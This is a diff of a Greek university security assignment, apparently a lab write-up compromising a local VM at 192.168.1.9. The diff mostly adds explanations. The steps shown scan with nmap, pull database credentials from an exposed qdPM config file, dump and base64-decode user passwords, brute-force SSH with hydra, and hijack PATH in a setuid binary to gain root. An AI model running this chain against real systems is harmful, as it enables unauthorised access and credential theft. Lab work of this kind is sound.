@@ -27,8 +27,8 @@ title: Υλοποίηση Επίθεσης σε Υπολογιστικό Σύσ�
 
 | Ονοματεπώνυμο    | ΑΜ           |
 | ---------------- | ------------ |
-| `=this.coauthor` | `=this.coAM` | 
-| `=this.author`   | `=this.AM`   |
+| `=this.coauthor` | `=this.coAM ` | 
+| `=this.author `   | `=this.AM `   |
 
 Ημερομηνία: `=this.date`
 
@@ -264,8 +264,10 @@ export ipt=192.168.1.9
 
 ## nmap script vuln
 
+Η επιλογη παραμετρου --script vuln κανει παραλληλη αναζητηση για ευπαθειες μαζι με τις υπηρεσιες που τρεχουν πισω απο ανοιχτες πορτες 
+
 ```bash
-nmap --script vuln 192.168.1.9 -oN nmap/machine_9_vuln
+nmap --script vuln $ipt -oN nmap/machine_9_vuln
 ```
 
 
@@ -324,7 +326,7 @@ nmap -Pn -sV --script vulners 192.168.1.9 -oN nmap/machine_9_vuln_2
 
 ## Identifying exploits 
 
-Απο το script αυτο μπορουμε να δουμε οτι ο υπολογιστης 1.9 τρεχει ενα web server με την υπηρεσια apache. 
+Απο το script αυτο μπορουμε να δουμε οτι  στην διευθυνση  `192.168.1.9` τρεχει ενα web server με την υπηρεσια apache. 
 Συγκεκριμενα οταν συνδεομαστε στο url http://192.168.1.9:80 βλεπουμε το περιεχομενο της σελιδας 
 
 ![600](UNI/Semester-9/ComputerSecurity/assignments/pasted-pic-assignment-working.png)
@@ -351,8 +353,14 @@ Shellcodes: No Results
 Or : Google Search: 
 [exploitdb Password Exposure](https://www.exploit-db.com/exploits/50176)
 
+Ο webserver εχει ευπαθεια Password Exposure, και μπορουμε να δουμε λεπτομεριες με τις επομενες δυο εντολες:
+
 ```bash
 cat /usr/share/exploitdb/exploits/php/webapps/50176.txt
+```
+ή 
+```bash
+searchsploit -x php/webapps/50176.txt
 ```
 
 ```bash
@@ -368,13 +376,14 @@ The password and connection string for the database are stored in a yml file. To
 ```
 
 
+
 ## Exploiting Vulnerabilities
 
 Exploiting using the vulnerability: 
 
-```bash
-searchsploit -x php/webapps/50176.txt
-```
+Το κενο ευπαθειας, δειχνει οτι υπαρχει ελευθερο το αρχειο που περιεχει συνθηματικα για την mysql βαση που στηριζεται το site.
+
+Ειτε παμε στην σελιδα απο το browser ειτε με την εντολη curl : 
 
 ```bash
 curl http://192.168.1.9:80/core/config/databases.yml 
@@ -414,7 +423,7 @@ whatweb http://$ipt
 
 ## Connecting to database 
 
-Συνδεομαστε στην βαση δεδομενων : 
+Συνδεομαστε στην βαση δεδομενων με το username και τον κωδικο που βρηκαμε απο το κενο ασφαλειας : 
 
 ```bash 
 mysql -u qdpmadmin -h 192.168.1.9 -p
@@ -430,8 +439,8 @@ Password:
 UcVQCMQk2STVeS6J
 ```
 
-με τον κωδικο και το username που βρηκαμε απο το vulnerability του qdpm
 
+Αφου συνδεθουμε στην MySQL βαση δεδομενων, θα περιηγηθουμε και θα επιλεξουμε την σωστη βαση και πινακες για να παρουμε δεδομενα που μας ενδιαφερουν
 
 ```bash
 MySQL [(none)]> show databases;
@@ -469,6 +478,7 @@ MySQL [staff]> show tables;
 3 rows in set (0,006 sec)
 
 ```
+
 
 ```bash
 MySQL [staff]> select * from user;
@@ -523,12 +533,14 @@ MySQL [staff]> select name,password from login join user on user_id=user.id;
 Αξιοποιωντας το site: [hashes.com](https://hashes.com/en/tools/hash_identifier) βλεπουμε οτι τα passwords ειναι κωδικοποιημενα σε μορφη base64
 
 
-
 ```
 WDdNUWtQM1cyOWZld0hkQw== - Possible algorithms: Base64(unhex(MD5($plaintext)))
 ```
 
 
+
+
+Για να τα αποκωδικοποιησουμε αξιοποιουμε την native εντολη base64 με την παραμετρο -d που κανει decode. 
 
 ```bash
 cat files/smith_password.b64 | base64 -d 
@@ -538,7 +550,7 @@ cat files/smith_password.b64 | base64 -d
 X7MQkP3W29fewHdC
 ```
 
-Γραφουμε ενα script για να αποθηκευσει τα αρχεια μας : 
+Γραφουμε ενα script για να αποθηκευσει τα αρχεια μας, κυριως για την δικη μας διευκολυνση  : 
 
 ```python
 #!/bin/python
@@ -609,26 +621,31 @@ if __name__ == "__main__":
 Δοκιμαζουμε καποιο απο τα passwords : 
 
 ```bash
-ssh lucas@$ipt
+ssh Lucas@$ipt
 ```
 
 
 ```
-lucas@192.168.1.9's password: 
+Lucas@192.168.1.9's password: 
 Permission denied, please try again.
-lucas@192.168.1.9's password: 
+Lucas@192.168.1.9's password: 
 Permission denied, please try again.
-lucas@192.168.1.9's password: 
+Lucas@192.168.1.9's password: 
 ```
 
 
-Υποψιαζομαστε οτι δεν εχουν αντιστοιχηθει σωστα τα passwords 
+Υποψιαζομαστε οτι δεν εχουν αντιστοιχηθει σωστα τα passwords , οποτε εχοντας μαζεψει ολα τα usernames και passwords σε δυο αρχεια αξιοποιουμε το εργαλειο hydra για να κανουμε bruteforce το login του ssh. 
+
 
 
 ```bash
 hydra -L files/users.txt -P files/passwords.txt ssh://$ipt
 ```
 
+| flag | explanation                             |
+| ---- | --------------------------------------- |
+| -L   | Ακολουθει ενα αρχειο με λιστα usernames |
+| -P   | Ακολουθει ενα αρχειο με λιστα passwords                                         |
 
 ```bash
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -643,6 +660,9 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-03 00:10:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-03 00:11:03
 
 ```
+
+Απο αυτο βλεπουμε οτι μονο δυο απο τα usernames και οι κωδικοι τους λειτουργουν για ssh login. 
+
 
 
 ### Connecting with ssh as travis
@@ -682,6 +702,9 @@ sudo -l
 Sorry, user travis may not run sudo on debian.
 ```
 
+Η εντολη sudo -l εμφανιζει τα δικαιωματα που εχει ο τωρινα συνδεδεμενος χρηστης. 
+
+
 Οποτε θα κοιταξουμε αν ο χρηστης dexter εχει περισσοτερα δικαιωματα στον server. 
 
 ### Connecting with ssh as dexter
@@ -717,6 +740,7 @@ I need to find out if there is a vulnerability or not.
 ```
 
 
+
 ---
 <div style="page-break-after: always;"></div>
 
@@ -743,6 +767,15 @@ Sorry, user dexter may not run sudo on debian.
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 ```
 
+| flag                | explanation                                          |
+| ------------------- | ---------------------------------------------------- |
+| /                   | root directory                                       |
+| -perm -4000         | files with the setuid bit set                        |
+| -type f             | κοιταζει μονο για αρχεια και οχι για directories     |
+| -exec ls -la {} \\; | Εκτελει την εντολη ls -la σε καθε αρχειο που βρισκει |
+| 2>/dev/null                    | μεταφερει ολα τα μηνυματα error στο /dev/null το οποιο τα κανει suppress                                                      |
+
+Αξιοποιωντας την εντολη find, αναζητουμε απο τον root folder τα αρχεια που εχει το setuid bit set, ειναι αρχεία 
 
 ```bash
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
@@ -880,9 +913,11 @@ socket@GLIBC_2.2.5
 cat /root/system.info
 ```
 
-γιατι βλεπουμε οτι μπορει να τρεξει cat στο root. 
+γιατι βλεπουμε οτι μπορει να τρεξει cat στο /root directory . 
 
-Το cat εχει absolute path : 
+Το cat δεν εχει absolute path στην 16 γραμμη.
+
+Με την παρακατω εντολη βρισκουμε ποιο προγραμμα καλει η εντολη cat οταν καλειται 
 
 
 ```bash
@@ -943,6 +978,8 @@ export PATH=/tmp:$PATH
 
 Ολη αυτη τη διαδικασια την κανουμε για να μπουμε στον φακελο root, στον οποιο δεν εχουμε προσβαση με αλλον λογαριασμο εκτος απο τον root. 
 
+Ελεγχουμε οτι δεν μπορουμε να μπουμε στον φακελλο oot 
+
 ```bash
 cd /root/
 ```
@@ -959,6 +996,8 @@ cd /root/
 dexter@debian:~$ /opt/get_access 
 root@debian:~# 
 ```
+
+Ετσι πλεον εχουμε αποκτησει super user access στον υπολογιστη.
 
 
 ## Root user access 
